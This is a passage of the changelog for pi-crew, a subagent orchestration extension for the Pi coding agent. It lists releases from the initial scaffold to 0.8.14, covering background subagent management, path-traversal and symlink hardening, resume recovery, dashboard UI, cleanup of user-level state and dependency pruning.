- Fixed live-agent durable control symlink-file rejection to return an API error instead of throwing from the tool handler.
- Tightened symlink artifact security assertions so tests check leaked file contents rather than safe metadata paths.

## 0.1.38

### Added

- Added parent-session wake-up for completed background subagents so the main agent automatically joins results and continues the original task.
- Added stronger resource/parser coverage for team role metadata and workflow task-body headings.

### Changed

- Clarified the current default worker execution model and local disable controls in project guidance.
- Aligned config schema constraints for UI settings with the published package schema.

### Fixed

- Hardened subagent abort handling so stopped records are persisted and late runner completion does not regress them to completed/error.
- Fixed blocked subagent result joins, blocked duration persistence, and final wake-up after blocked runs resume to terminal status.
- Blocked path traversal through workflow shared artifacts, run ids, imported run bundles, task-scoped mailbox APIs, agent runtime files, and untrusted artifact/transcript paths; hardened reads/writes with realpath containment to prevent symlink escapes; bound live-agent control to the selected run.
- Documented actual project resource paths for `.crew/` and `.pi/teams/` layouts.

## 0.1.31

### Fixed

- Added required Agent Skills frontmatter (`name` and `description`) to built-in coding skills so Pi loads them without conflicts.
- Tightened built-in skill package coverage to require standards-compliant frontmatter.

## 0.1.30

### Added

- Added Phase 6 async hardening: jiti loader resolution/fail-fast, async startup marker files, and early background-runner exit detection.
- Added worker concurrency hard cap with explicit `limits.allowUnboundedConcurrency` opt-out and observability event.
- Added persisted model routing metadata on tasks and agent records: requested model, resolved model, fallback chain, reason, and used attempt.
- Added self-contained architecture/runtime-flow docs and five built-in coding skills.
- Added mailbox replay on resume for pending inbox messages, including task-scoped messages.
- Added task resume checkpoints and recovery for crash-after-final-stdout and crash-after-artifact-write child-process tasks.
- Added async notifier detection for quiet dead background runners with durable `async.died` events.
- Added adaptive planner repair for malformed JSON, oversized task plans, and common role aliases before blocking implementation runs.
- Added package snapshot coverage for Phase 6 docs, skills, Pi manifest entries, and the runtime `jiti` dependency.
- Added `src/subagents/*` consolidation entrypoints for child spawning, background runner commands, and subagent manager APIs.
- Split `team-tool.ts` actions into focused status, inspect, lifecycle, cancel, and plan modules while preserving public action names.
- Split `register.ts` lifecycle wiring into command, team-tool, subagent-tool, and artifact-cleanup registration modules.
- Added async restart recovery integration smoke coverage for stale background pids.
- Added explicit recursive subagent depth and read-only role spawn-denial tests.

### Changed

- Async background runs now use an explicit jiti loader path and expose startup markers for recovery/health checks.
- Active batch selection now caps excessive user concurrency by default to protect local machines.
- Resume now emits mailbox replay metadata before restarting queued work.
- Child-process tasks now persist checkpoint phases (`started`, `child-spawned`, `child-stdout-final`, `artifact-written`) during execution.
- Split `task-runner.ts` prompt/progress/state/live helpers into focused modules while keeping `runTeamTask` as the public entrypoint.
- Moved live-session access behind `src/subagents/live/*` and dynamic task-runner imports so default child-process flow does not eagerly load live runtime code.

### Fixed

- Background runner startup failures are reported earlier instead of silently leaving queued/running manifests stale.

### Release prep notes

- Suggested next release grouping: `0.1.30` for Phase 6 runtime hardening, resume recovery, model observability, docs/skills, and internal refactors.
- Gate run locally: `npm run typecheck`, `npm test`, and `npm pack --dry-run`.
- No breaking public API changes: tool actions, slash commands, config schema, and package name remain stable.

## 0.1.29

- Republished the child worker response timeout fix as a fresh npm version.

## 0.1.28

- Fixed child-process workers being terminated after only 15 seconds of quiet provider/tool time by increasing the default response watchdog to five minutes and clarifying the timeout error message.

## 0.1.20

- Reworked the implementation workflow into an adaptive planner-led orchestration flow that decides the number, roles, and phases of subagents from the task instead of using a fixed fanout template.
- Added dynamic adaptive task injection, persisted adaptive task metadata, and resume reconstruction for planner-selected subagent steps.
- Block implementation runs when the planner does not produce a valid adaptive plan, including missing/unreadable planner artifacts and malformed/oversized plans.
- Added tests for adaptive plan parsing, dynamic batch fanout, invalid-plan blocking, writer-role support, and adaptive resume recovery.
- Hardened subagent/runtime fixes from post-0.1.19 review: env-isolated depth tests, foreground failure status updates, generic tool conflict aliases, and max_turns propagation.

## 0.1.19

- Added Claude-style `Agent`, `get_subagent_result`, and `steer_subagent` tools backed by pi-crew's durable worker runtime, plus conflict-safe `crew_agent`, `crew_agent_result`, and `crew_agent_steer` aliases.
- Added a durable subagent manager with background queueing, completion notifications, result joins, session-bound cleanup, and direct single-agent runs via `team run agent=...`.
- Disabled risky auto-opening of the right sidebar by default, added foreground completion notifications, and reduced duplicate widget/sidebar UI.
- Added progress coalescing and workflow concurrency helpers to keep foreground sessions responsive during busy worker output.
- Fixed live-session runs being classified as scaffold when workers are enabled and hardened session switch/shutdown cleanup for foreground child processes.

## 0.1.18

- Added a built-in `parallel-research` team/workflow for map-reduce style source audits with dynamic `Source/pi-*` fanout and parallel explorer shards.
- Made the live right sidebar the default foreground UI: active foreground runs auto-open a top-right live sidebar when the terminal is wide enough.
- Added live sidebar sections for active agents, waiting tasks, completed agents, task graph, model, tool, and token/usage details.
- Stopped materializing queued dependency tasks as child-process agents; status now separates active agents, waiting tasks, and completed agents.
- Added workflow-aware default concurrency so research/parallel-research can use ready parallel work instead of always running one worker.
- Dropped user/system prompt messages from child event persistence to avoid prompt/context leakage in agent event logs.
- Tightened child event compaction with separate assistant/tool input/tool result caps and improved powerbar active/waiting/model/token summaries.

## 0.1.17

- Fixed terminal/completed workers being incorrectly escalated as stale heartbeat blockers after all tasks completed.
- Cleaned child-process result extraction so result artifacts prefer final assistant output and no longer include worker prompt/context.
- Made `/team-dashboard` visibly render as a top-right sidebar by default with explicit right-sidebar title text.
- Added per-subagent model and usage fields to agent records, status output, and dashboard fallbacks so model/token totals stay visible while and after workers run.

## 0.1.16

- Added right-side `/team-dashboard` placement with model, token, and tool detail rows for subagents.
- Added UI config for dashboard placement/width and model/token/tool visibility.
- Foreground child-process runs now continue without blocking the interactive chat and remain tied to session shutdown.
- Child-process observability now drops noisy `message_update`/encrypted thinking deltas and stores compact events to prevent massive JSONL/output logs from freezing sessions.
- Cancel now syncs agent records and writes a foreground interrupt request so queued/running agents stop appearing stale.

## 0.1.15

- Child-process model selection now uses Pi-configured/available models and auto-discovers provider/model entries from Pi settings/models config.
- Added configured-model fallback chains for worker runs instead of forcing builtin provider hints.
- Fixed skipped task agent records so they no longer appear queued.

## 0.1.0

- Initial scaffold for `pi-crew`.
- Added Pi package manifest, extension entry, minimal team tool, slash commands, builtin resources, and documentation placeholders.

## [0.5.23] — Documentation & CI Update (2026-06-03)

### Highlights
- **CI typecheck re-enabled** — was disabled with stale comment about tsconfig errors
- All docs updated to v0.5.22 references

### Documentation
- README.md: version stamp v0.5.22, updated security highlights (12 items)
- SECURITY-ISSUES.md: added v0.5.17–v0.5.22 security fix summary
- SECURITY-AUDIT.md: scope updated to v0.5.22
- docs/architecture.md: v0.5.22, 38 rounds of review
- docs/pi-crew-bugs.md: v0.5.22 + historical note
- docs/TEST_MATRIX.md: test count updated to 2703
- docs/deep-review-report.md: marked historical
- docs/migration-v0.4-v0.5.md: drop-in replacement note

### CI
- `.github/workflows/ci.yml`: typecheck step re-enabled (was disabled since v0.3.x)

## [0.6.0] — Source Tour Patterns Implementation (2026-06-04)

### Highlights
- **15 patterns** implemented from 63-repo source tour (2,267 LOC)
- All patterns pass TypeScript strict mode with 0 errors
- 37 skills (including new council skill)

### Tier 1 — Quick Wins
- **Council skill** (Pattern 5): 3 adversarial roles for critical decisions
- **6 lifecycle hooks** (Pattern 12): after_run_complete, after_task_complete, session hooks
- **3-tier convention** (Pattern 13): Command→Agent→Skill documentation + effort field
- **Pre-step scripts** (Pattern 2): Deterministic scripts before LLM dispatch
- **Chain DSL parser** (Pattern 8): step1 -> parallel(step2, step3) -> step4

### Tier 2 — Medium-Term
- **DAG enhancements** (Pattern 7): findBlockedTasks, getBlockingTasks, topologicalSort
- **Drift detection** (Pattern 10): 5 detectors, 2-pass reconciliation
- **Hash-based task IDs** (Pattern 11): Base36 + adaptive length + hierarchical
- **Iterative retrieval** (Pattern 6): Score → converge → refine loop
- **Intercom bridge** (Pattern 9): Worker→orchestrator escalation queue
- **Plan templates** (Pattern 15): Built-in standard-review and full-implementation

### Tier 3 — Long-Term
- **Phase-gated intermediates** (Pattern 1): Disk-persistent step outputs
- **Incremental fingerprinting** (Pattern 3): Content hash + structural signature
- **4-tier memory** (Pattern 4): Working→Episodic→Semantic→Procedural with Ebbinghaus decay
- **Observation system** (Pattern 14): Capture→compress→re-inject with privacy tags

### Stats
- Test suite: 2698 pass + 1 skip, 0 fail
- TypeScript: 0 errors
- Skills: 37/37 PASS
- New modules: 11 files, 2,267 LOC

## [0.8.13] — user-scope cleanup + install side-effects warning (Issue #35) (2026-06-18)

Follow-up to issue #35's latest comment ("pi-crew leaves behind user-level
junk"). Two of the three points raised were valid; both addressed.

### `team action=cleanup scope=user` — new user-level cleanup mode
Removes pi-crew user-scope state that `pi uninstall npm:pi-crew` leaves behind:
- `~/.pi/agent/extensions/pi-crew/` — pi-crew runtime state (artifacts, state,
  config.json). Regenerable, always removed.
- `~/.pi/agent/agents/*.md.bak-<timestamp>-<hex>` — smoke-test backup junk
  pi-crew's own tests leave behind. NEVER touches real `*.md` agent files
  (pi-crew can't tell user-authored vs test-copied — only the timestamped
  `.bak-*` pattern is removed).
- `~/.pi/agent/pi-crew.json` — global config. Gated on `force=true` (may hold
  your customized settings).

`dryRun=true` previews; safe by default. Routes via the new `scope=user` flag
on `team action=cleanup`.

### Install side-effects warning (install.mjs)
The postinstall script now prints an explicit "What pi-crew writes (and how to
undo it)" block: AGENTS.md injection (marker-delimited, on `init` only),
`.crew/` runtime dir, the global config created at install, and the full
uninstall command sequence (project + user + `pi uninstall`). Nothing is hidden
behind install — be upfront about side effects.

### README Uninstall section expanded
Split into Project scope + User scope subsections, with the full 6-step
uninstall flow and a note that authored agent files are never touched.

### On the third claim (hijacks pi-intercom)
Still not reproduced. Verified a third time: `grep -rni pi-intercom src/` → 0
references. `crew-input-router.ts:11` passes slash commands through unchanged.
The reply on the issue asks again for a concrete repro.

typecheck clean; +6 user-scope cleanup tests + 1 routing test update; full
suite 2963/0.

## [0.8.14] — stop injecting AGENTS.md on init (Issue #35, redundant) (2026-06-18)

`team action=init` no longer writes a guidance block into the project's
`AGENTS.md`. AGENTS.md is the USER's project-instructions file (Pi loads it as
project guidance), and the injected block was **redundant**: the `team` tool
already self-describes via its tool registration (`description` + `promptSnippet`
in `src/extension/registration/team-tool.ts:63-64`), which Pi injects into the
agent's system prompt every session. So agents still learn pi-crew's commands —
from the tool, not AGENTS.md.

- Removed `injectGuidance(AGENTS.md, ...)` call from `initializeProject()`
  (`src/extension/project-init.ts`).
- Removed `guidancePath` / `guidanceModified` from `ProjectInitResult`.
- Removed now-unused `getPackageVersion()` + the markers import.
- `team action=cleanup` STILL removes any block injected by older versions
  (<0.8.14) — backward-compat preserved via `removeGuidance`.
- README Uninstall section + install.mjs warning note the v0.8.14 behavior
  change.

Scope rationale: pi-crew is a sub-agent orchestration extension. Modifying a
user's project-instructions file was out-of-scope and unnecessary.

+4 regression tests (init does NOT create/modify AGENTS.md; API fields removed).
typecheck clean; full suite 2972/0.

## [Unreleased] — dead-dep cleanup + non-blocking fallow CI (2026-06-18)

Spotted by running `fallow` (deterministic Rust codebase intelligence) against
the repo. Two genuine wins, plus an informational CI job that never blocks.

### Removed (dead dependencies, verified unused)
- **`typebox`** (`package.json:89`) — dead duplicate of `@sinclair/typebox`
  (which 10 source files actually import). `typebox` (plain) had **zero**
  imports anywhere in `src/`.
- **`acorn`** (`package.json:84`) — **zero** runtime references in `src/`,
  `scripts/`, or `*.mjs`. Verified the only other package referencing it
  (`jiti`) lists it under its own `devDependencies` (for jiti's own tests), so
  it is not a runtime transitive need. `npm ls acorn` confirmed `pi-crew` was
  its sole parent.

  Both removals verified: typecheck clean, full suite 2965/0.

### CI: added `fallow-audit` job (non-blocking)
- New job in `.github/workflows/ci.yml`: ubuntu-only, `continue-on-error: true`
  so it **never fails the build**.
- Runs `fallow audit` (changed-code diff vs base ref) in JSON + human summary,
  uploads `fallow-audit-report` artifact (14-day retention).
- Surfaced findings (dead code, circular deps, duplication, complexity
  hotspots, dependency hygiene) are for human/agent review, NOT a merge gate.
- Rationale for non-blocking: fallow has high out-of-the-box noise (254 clone
  families, 379 hotspots) + a false positive on the tsx/jiti path-loading
  pattern (`jiti` flagged unused but is used via runtime path-loading). A
  blocking gate would create an unpaid maintenance backlog unsuitable for a
  solo-maintained extension.
